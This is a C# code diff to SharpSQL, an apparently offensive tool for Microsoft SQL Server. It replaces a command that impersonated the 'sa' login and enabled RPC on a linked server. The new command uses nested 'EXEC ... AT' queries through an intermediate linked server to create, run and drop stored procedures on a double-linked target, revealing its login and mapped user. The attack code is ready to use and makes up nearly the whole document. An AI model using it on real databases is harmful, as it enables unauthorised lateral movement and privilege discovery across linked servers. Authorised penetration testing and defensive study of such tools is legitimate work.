@@ -5,20 +5,21 @@ using System.Data.SqlClient;
 
 namespace SharpSQL.Commands
 {
-    public class linkedrpc : ICommand
+    public class dbllinkedlogin : ICommand
     {
-        public static string CommandName => "linkedrpc";
+        public static string CommandName => "dbllinkedlogin";
 
         public void Execute(Dictionary<string, string> arguments)
         {
-            Console.WriteLine("[*] Action: Reconfigure Linked SQL Server to Allow RPC connections:");
-            Console.WriteLine("\tSharpSQL.exe rpc /db:DATABASE /server:SERVER /target:TARGET [/sqlauth /user:SQLUSER /password:SQLPASSWORD]\r\n");
+            Console.WriteLine("[*] Action: Execute Procedures to Get Login Information on Double-Linked SQL Server:");
+            Console.WriteLine("\tUsage: SharpSQL.exe dbllinkedlogin /db:DATABASE /server:SERVER /intermediate:INTERMEDIATE /target:TARGET [/sqlauth /user:SQLUSER /password:SQLPASSWORD]\r\n");
 
             string user = "";
             string password = "";
             string connectInfo = "";
             string database = "";
             string connectserver = "";
+            string intermediate = "";
             string target = "";
 
             bool sqlauth = false;
@@ -35,6 +36,10 @@ namespace SharpSQL.Commands
             {
                 connectserver = arguments["/server"];
             }
+            if (arguments.ContainsKey("/intermediate"))
+            {
+                intermediate = arguments["/intermediate"];
+            }
             if (arguments.ContainsKey("/target"))
             {
                 target = arguments["/target"];
@@ -50,9 +55,13 @@ namespace SharpSQL.Commands
                 Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                 return;
             }
+            if (String.IsNullOrEmpty(intermediate))
+            {
+                Console.WriteLine("\r\n[X] You must supply an intermediate server!\r\n");
+            }
             if (String.IsNullOrEmpty(target))
             {
-                Console.WriteLine("\r\n[X] You must supply a target linked SQL server!\r\n");
+                Console.WriteLine("\r\n[X] You must supply a target server!\r\n");
                 return;
             }
 
@@ -96,21 +105,49 @@ namespace SharpSQL.Commands
                 Environment.Exit(0);
             }
 
-            string execAs = "EXECUTE AS LOGIN = 'sa';";
-            SqlCommand command = new SqlCommand(execAs, connection);
-            SqlDataReader reader = command.ExecuteReader();
-            reader.Read();
-            Console.WriteLine("\n[*] Attempting impersonation..");
-            reader.Close();
+            string createProc = $"EXEC ('EXEC (''CREATE PROCEDURE whoami AS SELECT SYSTEM_USER;'') AT [{target}]') AT {intermediate}";
+			SqlCommand command = new SqlCommand(createProc, connection);
+			SqlDataReader reader = command.ExecuteReader();
+			reader.Read();
+			Console.WriteLine("\n[*] Creating First Temporary Procedure..");
+			reader.Close();
 
-            string enableRPC = $"EXEC sp_serveroption '{target}', 'rpc', 'true'; EXEC sp_serveroption '{target}', 'rpc out', 'true';";
-            command = new SqlCommand(enableRPC, connection);
-            reader = command.ExecuteReader();
-            reader.Read();
-            Console.WriteLine($"[*] Successfully Reconfigured {target} to Allow RPC Connections!");
-            reader.Close();
+			createProc = $"EXEC ('EXEC (''CREATE PROCEDURE whoisuser AS SELECT USER_NAME();'') AT [{target}]') AT {intermediate}";
+			command = new SqlCommand(createProc, connection);
+			reader = command.ExecuteReader();
+			reader.Read();
+			Console.WriteLine("[*] Creating Second Temporary Procedure..");
+			reader.Close();
 
-            connection.Close();
+			string whoami = $"EXEC ('EXEC (''EXEC whoami'') AT [{target}]') AT {intermediate}";
+			command = new SqlCommand(whoami, connection);
+			reader = command.ExecuteReader();
+			reader.Read();
+			Console.WriteLine("[+] Logged in as: " + reader[0]);
+			reader.Close();
+
+			string whoisuser = $"EXEC ('EXEC (''EXEC whoisuser'') AT [{target}]') AT {intermediate}";
+			command = new SqlCommand(whoisuser, connection);
+			reader = command.ExecuteReader();
+			reader.Read();
+			Console.WriteLine("[+] Mapped to user: " + reader[0]);
+			reader.Close();
+
+			string dropProc = $"EXEC ('EXEC (''DROP PROCEDURE whoami'') AT [{target}]') AT {intermediate}";
+			command = new SqlCommand(dropProc, connection);
+			reader = command.ExecuteReader();
+			reader.Read();
+			Console.WriteLine("[*] Dropping First Temporary Procedure..");
+			reader.Close();
+
+			dropProc = $"EXEC ('EXEC (''DROP PROCEDURE whoisuser'') AT [{target}]') AT {intermediate}";
+			command = new SqlCommand(dropProc, connection);
+			reader = command.ExecuteReader();
+			reader.Read();
+			Console.WriteLine("[*] Dropping Second Temporary Procedure..");
+			reader.Close();
+
+			connection.Close();
         }
     }
 }
